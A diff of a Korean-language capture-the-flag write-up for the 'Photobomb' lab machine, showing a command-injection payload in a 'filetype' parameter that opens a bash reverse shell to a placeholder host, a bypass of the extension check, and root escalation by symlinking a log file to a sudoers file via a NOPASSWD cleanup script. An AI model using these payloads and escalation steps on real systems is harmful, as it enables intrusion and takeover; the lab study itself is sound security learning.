@@ -27,7 +27,7 @@
 
 - 이미지 다운로드 버튼을 클릭하면 아래의 파라미터들이 POST 메소드를 통해 전달된다.
   
-~~~http
+~~~
         photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg&dimensions=30x20
         
 ~~~
@@ -115,7 +115,7 @@ command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resize
 
 - filetype 파라미터에 명령어 부분을 직접 넣으면
 
-~~~http
+~~~
 photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=%26%26bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%200%3E%261%27&dimensions=30x20
 ~~~
 
@@ -129,22 +129,91 @@ if !filetype.match(/^(png|jpg)/)
   end
 ~~~
 
-- 문자열의 시작 부분에 png나 jpg가 존재하는가에 대해서만 체크하기 때문에 이 조건만 만족시켜서 다시 파라미터 값을 작성하면 (앞쪽에 jpg만 붙이고 동일하게 작성하면 된다.)
+- 문자열의 시작 부분에 png나 jpg가 존재하는가에 대해서만 체크하기 때문에 이 조건만 만족시켜서 다시 파라미터 값을 작성하면 (앞쪽에 jpg나 png만 붙이고 동일하게 작성하면 된다.)
 
-~~~http
+~~~
 hoto=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg%26%26bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%200%3E%261%27&dimensions=30x20
 ~~~
 
+- 확장자 뒤쪽에 쉘 실행 명령어를 붙이면 다음과 같이 접속에 성공한다.
+
 ~~~shell
-wizard@photobomb:~/photobomb$
+bash: cannot set terminal process group (722): Inappropriate ioctl for device
+bash: no job control in this shell
+wizard@photobomb:~/photobomb$ 
 ~~~
+
 
 
 <a id="escal"></a>
 
 # 권한 상승
 
-- test
+- 우선, sudo -l을 통해 sudo 권한이 걸린 명령어를 확인해보면 다음과 같은 결과가 출력된다.
+
+~~~shell
+wizard@photobomb:~/photobomb$ sudo -l
+
+Matching Defaults entries for wizard on photobomb:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User wizard may run the following commands on photobomb:
+    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+~~~
+
+- cleanup.sh 파일의 내용은 다음과 같다.
+
+~~~shell
+#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
 
 
 
+# clean up log files
+if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log > log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+~~~
+
+
+- cleanup.sh는 photobomb.log에 로깅된 내용이 있으면 photobomb.log.old 파일에 덮어쓰고 photobomb.log는 0 bytes로 trunate한다.
+
+- 그리고 root 유저 권한으로 이 작업들을 실행하므로 덮어쓰고자 하는 파일(photobomb.log.old)에 부여된 파일 권한과 상관없이 이 작업을 수행할 수 있다. (어떤 파일이든 덮어쓸 수 있다.)
+
+- 따라서 sudoers 파일을 조작하기 위해 다음과 같이 심볼릭 링크를 걸어준다. (파일이 이미 존재하면 photobomb.log.old 파일을 삭제한 뒤에 링크를 건다.)
+
+~~~shell
+wizard@photobomb:~/photobomb$ ln -s /etc/sudoers.d/photobomb ~/photobomb/log/photobomb.log.old
+~~~
+
+- 아래와 같이 심볼릭 링크가 제대로 되었는지 확인한 후에
+
+~~~shell
+lrwxrwxrwx 1 wizard wizard 24 Nov  8 02:22 /home/wizard/photobomb/log/photobomb.log.old -> /etc/sudoers.d/photobomb
+~~~
+
+- sudo 권한을 부여하기 위한 내용을 photobomb.log 파일에 작성하고
+
+~~~shell
+wizard@photobomb:~/photobomb$ echo "wizard ALL=(ALL) NOPASSWD: ALL" > ~/photobomb/log/photobomb.log
+~~~
+
+- 마지막으로/opt/cleanup.sh를 실행하면
+
+~~~shell
+wizard@photobomb:~/photobomb$ sudo /opt/cleanup.sh
+~~~
+
+- 다음과 같이 root 권한으로 상승할 수 있다.
+
+~~~shell
+wizard@photobomb:~/photobomb$ sudo su
+root@photobomb:/home/wizard/photobomb#
+~~~
